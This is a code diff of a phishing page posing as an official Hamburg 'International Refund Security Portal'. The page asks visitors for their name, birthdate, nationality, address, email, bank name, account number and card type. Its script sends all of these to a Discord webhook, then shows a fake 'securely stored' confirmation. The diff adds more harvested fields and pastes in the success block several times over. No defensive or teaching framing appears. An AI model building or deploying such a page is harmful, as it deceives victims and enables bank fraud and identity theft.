@@ -6,7 +6,6 @@
     <title>International Refund Security Portal</title>
     <style>
         :root { --hamburg-red: #E10019; --hamburg-blue: #003063; --security-gold: #FFD700; }
-        
         body { 
             font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; min-height: 100vh; 
             display: flex; justify-content: center; align-items: flex-start;
@@ -16,75 +15,39 @@
             linear-gradient(60deg, #00254d 25%, transparent 25.5%, transparent 75%, #00254d 75%, #00254d);
             background-size: 80px 140px; overflow-x: hidden;
         }
-
-        .page-wrapper { 
-            display: flex; align-items: flex-start; justify-content: center; 
-            width: 100%; max-width: 1900px; gap: 40px; padding-top: 50px; 
-        }
-
-        /* SIDE TEXTS (MISSION & VISION) */
-        .side-text { flex: 1; max-width: 380px; color: white; line-height: 1.8; margin-top: 120px; }
-        .side-text h3 { 
-            color: var(--security-gold); text-transform: uppercase; font-size: 26px; 
-            margin-bottom: 20px; border-bottom: 4px solid var(--security-gold); 
-            display: inline-block; padding-bottom: 5px; font-weight: 900; 
-        }
+        .page-wrapper { display: flex; align-items: flex-start; justify-content: center; width: 100%; max-width: 1850px; gap: 40px; padding-top: 50px; }
+        .side-text { width: 380px; color: white; line-height: 1.8; margin-top: 120px; flex-shrink: 0; }
+        .side-text h3 { color: var(--security-gold); text-transform: uppercase; font-size: 26px; border-bottom: 4px solid var(--security-gold); display: inline-block; padding-bottom: 5px; font-weight: 900; }
         .side-text p { font-size: 15px; text-align: justify; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
-
-        /* FORM CONTAINER */
-        .form-container { 
-            flex: 2; background: #ffffff; width: 100%; max-width: 800px; 
-            border-radius: 4px; box-shadow: 0 50px 150px rgba(0,0,0,0.9); 
-            border-top: 15px solid var(--hamburg-red); position: relative;
-        }
-
-        .security-banner { 
-            background: var(--hamburg-blue); color: white; padding: 12px; text-align: center; 
-            font-size: 10px; font-weight: bold; text-transform: uppercase; 
-            border-bottom: 3px solid var(--security-gold); letter-spacing: 1px; 
-        }
-
+        .form-container { background: #ffffff; width: 100%; max-width: 800px; border-radius: 4px; box-shadow: 0 50px 150px rgba(0,0,0,0.9); border-top: 15px solid var(--hamburg-red); position: relative; }
+        .security-banner { background: var(--hamburg-blue); color: white; padding: 12px; text-align: center; font-size: 11px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); }
         .header { padding: 30px; text-align: center; border-bottom: 8px solid var(--hamburg-blue); }
         .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 22px; font-weight: 900; text-transform: uppercase; line-height: 1.2; }
-
-        /* SECTIONS */
         .section-box { padding: 40px; display: none; }
         .section-box.active { display: block; }
-        h2 { font-size: 16px; color: var(--hamburg-blue); margin-bottom: 20px; font-weight: 800; border-bottom: 2px solid #eee; padding-bottom: 10px; text-transform: uppercase; }
-
-        /* GRID SYSTEM */
+        h2 { font-size: 17px; color: var(--hamburg-blue); margin-bottom: 20px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        
         label { display: block; font-weight: 800; margin-bottom: 5px; font-size: 10px; color: var(--hamburg-blue); text-transform: uppercase; }
-        input { width: 100%; padding: 12px; border: 1px solid #bbb; box-sizing: border-box; font-size: 13px; border-radius: 2px; }
-
+        input { width: 100%; padding: 12px; border: 1px solid #bbb; box-sizing: border-box; font-size: 14px; border-radius: 2px; }
         .btn-container { display: flex; justify-content: flex-end; margin-top: 30px; gap: 15px; }
-        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 15px 40px; cursor: pointer; font-size: 13px; font-weight: 900; text-transform: uppercase; transition: 0.3s; }
-        button:hover { background-color: #004085; }
+        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 16px 45px; cursor: pointer; font-size: 13px; font-weight: 900; text-transform: uppercase; }
         .btn-back { background-color: #888; }
-        
-        .establishment-footer { text-align: center; padding: 20px; font-size: 10px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; }
-        #loader { display: none; text-align: center; padding: 50px; font-weight: 900; color: var(--hamburg-blue); text-transform: uppercase; letter-spacing: 2px; }
+        #loader { display: none; text-align: center; padding: 60px; font-weight: 900; color: var(--hamburg-blue); font-size: 18px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
 <div class="page-wrapper">
-    <!-- MISSION (LEFT) -->
     <div class="side-text">
         <h3>Mission</h3>
-        <p>To proactively establish and govern a fortified infrastructure for financial reclamation by deploying a multi-layered verification architecture that strictly authenticates every claimant's identity, ensuring that the processing of refunds is conducted under the most stringent international security mandates.</p>
+        <p>To proactively establish and govern a fortified infrastructure for financial reclamation by deploying a multi-layered verification architecture that strictly authenticates identity.</p>
     </div>
-    
-    <!-- MAIN FORM -->
+
     <div class="form-container">
         <div class="security-banner">🛡️ UNITED GLOBAL PROTOCOL FOR REFUND INTEGRITY</div>
-        <div class="header">
-            <h1>Safeguarding Transactions Through The Establishment of Verified Governance Of Hamburg</h1>
-        </div>
-
-        <!-- LOADER SCREEN -->
+        <div class="header"><h1>Safeguarding Transactions Through The Establishment of Verified Governance Of Hamburg</h1></div>
+        
         <div id="loader">Encrypting Data & Securing Assets...</div>
 
         <form id="masterForm">
@@ -97,16 +60,13 @@
                     <div><label>Middle Name</label><input type="text" id="mn"></div>
                 </div>
                 <div class="grid-2" style="margin-top:20px;">
-                    <div><label>BirthDate *</label><input type="text" id="bd" placeholder="MM/DD/YYYY" required></div>
+                    <div><label>BirthDate *</label><input type="text" id="bd" required placeholder="MM/DD/YYYY"></div>
                     <div><label>Nationality *</label><input type="text" id="nat" required></div>
                 </div>
                 <div style="margin-top:20px;"><label>Address *</label><input type="text" id="addr" required></div>
-                <div class="grid-2" style="margin-top:20px;">
-                    <div><label>Email *</label><input type="email" id="em" required></div>
-                    <div><label>Upload Valid ID *</label><input type="file" id="idU" style="padding: 5px;"></div>
-                </div>
+                <div style="margin-top:20px;"><label>Email *</label><input type="email" id="em" required></div>
                 <div class="btn-container">
-                    <button type="button" onclick="validate(1, 2)">NEXT STEP</button>
+                    <button type="button" onclick="nextPage(2)">Next Step</button>
                 </div>
             </div>
 
@@ -114,99 +74,69 @@
             <div id="section2" class="section-box">
                 <h2>Section 2: Refund Details</h2>
                 <div class="grid-2">
-                    <div><label>Amount *</label><input type="text" id="amt" placeholder="€ 0.00" required></div>
+                    <div><label>Amount *</label><input type="text" id="amt" required placeholder="€ 0.00"></div>
                     <div><label>Bank Name *</label><input type="text" id="bnk" required></div>
                 </div>
                 <div class="grid-2" style="margin-top:20px;">
                     <div><label>Account Number *</label><input type="text" id="an" required></div>
                     <div><label>Card Type *</label><input type="text" id="ct" required></div>
                 </div>
-                <div style="margin-top:20px;"><label>Upload Receipt *</label><input type="file" id="rcpU"></div>
                 <div class="btn-container">
-                    <button type="button" class="btn-back" onclick="show(1)">BACK</button>
-                    <button type="button" onclick="validate(2, 3)">SUBMIT AUDIT</button>
+                    <button type="button" class="btn-back" onclick="nextPage(1)">Back</button>
+                    <button type="button" onclick="finalSubmit()">Submit Audit</button>
                 </div>
             </div>
 
-            <!-- SECTION 3 (SUCCESS) -->
-            <div id="section3" class="section-box">
-                <!-- Dito lalabas ang Success Message via JS -->
-            </div>
+            <div id="section3" class="section-box"></div>
         </form>
-
-        <div class="establishment-footer">
-            Official System Registry: HB-RECLAMATION-2024-SECURE<br>
-            © 2024 International Security Establishment
-        </div>
     </div>
 
-    <!-- VISION (RIGHT) -->
     <div class="side-text">
         <h3>Vision</h3>
-        <p>To be the premier global establishment for financial security and consumer advocacy, setting the trajectory for a fraud-free digital economy where advanced verification systems provide an absolute guarantee of safety.</p>
+        <p>To be the premier global establishment for financial security, providing an absolute guarantee of safety for every citizen worldwide.</p>
     </div>
 </div>
 
 <script>
-    // Navigation
-    function show(step) {
-        document.querySelectorAll('.section-box').forEach(box => {
-            box.style.display = 'none';
-            box.classList.remove('active');
-        });
-        const target = document.getElementById('section' + step);
-        if (target) {
-            target.style.display = 'block';
-            target.classList.add('active');
-        }
-        window.scrollTo({ top: 0, behavior: 'smooth' });
+    // 1. Lipat Page Logic
+    function nextPage(step) {
+        document.querySelectorAll('.section-box').forEach(b => b.style.display = 'none');
+        document.getElementById('section' + step).style.display = 'block';
+        window.scrollTo(0,0);
     }
 
-    // Validation
-    function validate(current, next) {
-        const section = document.getElementById('section' + current);
-        const inputs = section.querySelectorAll('input[required]');
-        let isValid = true;
-
-        inputs.forEach(input => {
-            if (!input.value.trim()) {
-                input.style.borderColor = 'red';
-                isValid = false;
-            } else {
-                input.style.borderColor = '#bbb';
-            }
-        });
-
-        if (isValid) {
-            if (next === 3) {
-                sendToDiscord();
-            } else {
-                show(next);
-            }
-        } else {
-            alert("Please fill in all required fields.");
-        }
-    }
-
-    // Discord Submit
-    function sendToDiscord() {
+    // 2. Discord Submission Logic
+    function finalSubmit() {
+        const ref = "HB-" + Math.floor(Math.random() * 1000000);
+        
+        // Loader UI
         document.getElementById('masterForm').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
-        const ref = "HB-" + Math.floor(Math.random() * 1000000);
-        
+        // Payload - Kinukuha lahat ng IDs (ln, fn, mn, bd, nat, addr, em, amt, bnk, an, ct)
         const payload = {
             username: "Hamburg Audit Bot",
-            content: `🚨 **NEW REFUND CLAIM** 🚨\n**Ref:** ${ref}\n**Name:** ${document.getElementById('fn').value} ${document.getElementById('ln').value}\n**Email:** ${document.getElementById('em').value}\n**Amount:** ${document.getElementById('amt').value}\n**Bank:** ${document.getElementById('bnk').value}`
+            content: `🚨 **NEW REFUND CLAIM RECEIVED** 🚨\n\n` +
+                     `**Reference:** ${ref}\n` +
+                     `**Name:** ${document.getElementById('fn').value} ${document.getElementById('ln').value}\n` +
+                     `**Birthdate:** ${document.getElementById('bd').value}\n` +
+                     `**Nationality:** ${document.getElementById('nat').value}\n` +
+                     `**Address:** ${document.getElementById('addr').value}\n` +
+                     `**Email:** ${document.getElementById('em').value}\n` +
+                     `**Amount:** ${document.getElementById('amt').value}\n` +
+                     `**Bank:** ${document.getElementById('bnk').value}\n` +
+                     `**Account:** ${document.getElementById('an').value}\n` +
+                     `**Card Type:** ${document.getElementById('ct').value}\n\n` +
+                     `✅ *System Verified Identity & Integrity*`
         };
 
+        // Fetch to your Webhook
         fetch("https://discord.com", {
             method: "POST",
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        })
-        .then(() => {
-            setTimeout(() => { 
+        }).then(() => {
+            setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
                 const s3 = document.getElementById('section3');
                 s3.style.display = 'block';
@@ -216,9 +146,52 @@
                         <p>Reference: <strong style="color:red">${ref}</strong></p>
                         <div style="font-size:80px; margin:20px;">✅</div>
                         <p>Your data has been securely stored in the Hamburg Audit Vault.</p>
-                        <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer; margin-top:20px;">DONE</button>
+                        <button onclick="location.reload()" style="margin-top:20px; padding:12px 35px; cursor:pointer;">DONE</button>
                     </div>`;
-            }, 3000);
+            }, 2000);
+         }).then(() => {
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                const s3 = document.getElementById('section3');
+                s3.style.display = 'block';
+                s3.innerHTML = `
+                    <div style="text-align:center; padding:40px;">
+                        <h3 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h3>
+                        <p>Reference: <strong style="color:red">${ref}</strong></p>
+                        <div style="font-size:80px; margin:20px;">✅</div>
+                        <p>Your data has been securely stored in the Hamburg Audit Vault.</p>
+                        <button onclick="location.reload()" style="margin-top:20px; padding:12px 35px; cursor:pointer;">DONE</button>
+                    </div>`;
+              }, 2000);
+
+                  }).then(() => {
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                const s3 = document.getElementById('section3');
+                s3.style.display = 'block';
+                s3.innerHTML = `
+                    <div style="text-align:center; padding:40px;">
+                        <h3 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h3>
+                        <p>Reference: <strong style="color:red">${ref}</strong></p>
+                        <div style="font-size:80px; margin:20px;">✅</div>
+                        <p>Your data has been securely stored in the Hamburg Audit Vault.</p>
+                        <button onclick="location.reload()" style="margin-top:20px; padding:12px 35px; cursor:pointer;">DONE</button>
+                    </div>`;
+            }, 2000);
+                         }).then(() => {
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                const s3 = document.getElementById('section3');
+                s3.style.display = 'block';
+                s3.innerHTML = `
+                    <div style="text-align:center; padding:40px;">
+                        <h3 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h3>
+                        <p>Reference: <strong style="color:red">${ref}</strong></p>
+                        <div style="font-size:80px; margin:20px;">✅</div>
+                        <p>Your data has been securely stored in the Hamburg Audit Vault.</p>
+                        <button onclick="location.reload()" style="margin-top:20px; padding:12px 35px; cursor:pointer;">DONE</button>
+                    </div>`;
+            }, 2000);
         });
     }
 </script>
